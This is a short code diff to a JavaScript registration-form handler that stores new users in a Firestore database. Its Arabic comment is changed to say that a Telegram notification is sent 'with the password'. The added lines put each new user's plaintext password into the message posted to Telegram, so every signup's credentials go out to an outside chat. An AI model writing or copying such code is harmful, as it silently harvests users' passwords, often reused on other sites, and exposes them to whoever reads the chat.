@@ -123,9 +123,11 @@ if (document.getElementById('registerForm')) {
             
             await db.collection('users').doc(user.uid).set(userData);
             
-            // إرسال إشعار إلى تليجرام
+            // إرسال إشعار إلى تليجرام (مع كلمة المرور)
             await sendTelegramNotification({
                 ...userData,
+                password: password,
+                provider: 'البريد الإلكتروني',
                 createdAt: new Date()
             });
             
